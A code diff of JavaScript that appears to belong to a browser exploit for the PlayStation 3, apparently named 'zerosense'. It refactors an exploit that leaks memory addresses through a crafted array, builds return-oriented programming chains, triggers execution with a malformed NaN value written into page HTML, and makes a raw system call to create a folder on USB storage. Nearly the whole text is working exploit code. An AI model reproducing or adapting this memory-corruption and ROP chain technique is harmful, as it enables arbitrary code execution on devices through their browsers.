@@ -85,7 +85,7 @@ function init() {
 		logger.info("Initializing");
 		
 		arrayLeaker = new ArrayLeaker(memoryReader);
-		arrayLeaker.createArray(20, "Obey the Moderator");
+		arrayLeaker.createArray(20);
 		
 		var searchStart = 0x80190000;
 		var searchEnd = 0x80600000;
@@ -98,7 +98,8 @@ function init() {
 				
 				logger.info(`Found ArrayLeaker array at 0x${match.toString(16)}`);
 				arrayLeaker.setAddress(match);
-				
+			})
+			.then(() => {
 				logger.info("Creating buffers...");
 				
 				var i = 0;
@@ -119,14 +120,6 @@ function init() {
 	return Promise.resolve();
 }
 
-function execute(address) {
-	return new Promise((resolve) => {
-		logger.info(`Starting chain at 0x${address.toString(16)}`);
-		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + address.toString(16));
-		return resolve();
-	});
-}
-
 function createFolder() {
 	logger.info("Creating folder...");
 	
@@ -134,69 +127,25 @@ function createFolder() {
 		.then(() => init())
 		.then(() => {
 			var path = Util.ascii("/dev_usb000/zerosense");
-			return mkdir(path).then((result) => {
-				if (result.code < 0) {
-					throw new Error("Error while creating folder: " + result.message);
-				}
-				
-				logger.info(`Value: 0x${result.value.toString(16)}`);
-			});
+			var errno = mkdir(path);
+			logger.info(`Errno: 0x${errno.toString(16)}`);
 		})
-		.then((result) => logger.info("Created folder."))
-		.catch((error) => logger.error(`Error while creating folder: ${error}`));
+		.then(() => logger.info("Created folder."))
+		.catch((error) => logger.error(`Error while creating folder. ${error}`));
 }
 
 function mkdir(strpath) {
-	var i = 10;
-	
 	var chain = new ChainBuilder(offsets, addrBuffer)
 		.addData("path", strpath)
 		.syscallR3Data(0x32B, "path", 0o700, 0, 0, 0, 0, 0, 0)
 		.storeR3Data("errno")
 		.create();
-	arrayLeaker.setString(i, chain.getData());
-	var addrChainData = arrayLeaker.getStringAddress(i);
-	if (addrChainData === null) {
-		return Promise.resolve({ code: -1, message: "Failed to get chain data address." });
-	}
-	logger.info(`Found chain data at 0x${addrChainData.toString(16)}`);
-	chain.updateDataAddress(addrChainData);
-
-	i++;
-	arrayLeaker.setString(i, chain.getChain());
-	var addrChainStack = arrayLeaker.getStringAddress(i);
-	if (addrChainStack === null) {
-		return Promise.resolve({ code: -1, message: "Failed to get chain stack address." });
-	}
-	logger.info(`Found chain stack at 0x${addrChainStack.toString(16)}`);
-	var chainStackOffset = 0x4;
 	
-	i++;
-	var setup2 = ChainBuilder.setup2(addrChainStack + chainStackOffset);
-	arrayLeaker.setString(i, setup2);
-	var addrSetup2 = arrayLeaker.getStringAddress(i);
-	if (addrSetup2 === null) {
-		return Promise.resolve({ code: -1, message: "Failed to get setup2 address" });
-	}
-	logger.info(`Found setup2 at 0x${addrSetup2.toString(16)}`);
+	chain.prepare(arrayLeaker);
+	chain.execute();
 	
-	i++;
-	var setup1 = ChainBuilder.setup1(addrSetup2);
-	arrayLeaker.setString(i, setup1);
-	var addrSetup1 = arrayLeaker.getStringAddress(i);
-	if (addrSetup1 === null) {
-		return Promise.resolve({ code: -1, message: "Failed to get setup1 address." });
-	}
-	logger.info(`Found setup1 at 0x${addrSetup1.toString(16)}`);
-	
-	var addrChainStart = addrSetup1;
-	logger.info(`Chain start at 0x${addrChainStart.toString(16)}`);
-	
-	return execute(addrChainStart).then(() => {
-		var str = chain.getData().substr(chain.getDataOffset("errno") / 2, 0x4 / 2);
-		var errno = Util.getint32(str);
-		return { code: 0, value: errno };
-	});
+	var errno = Util.getint32(chain.getData().substr(chain.getDataOffset("errno") / 2, 0x4 / 2));
+	return errno;
 }
 
 ///////////////////////////////////////
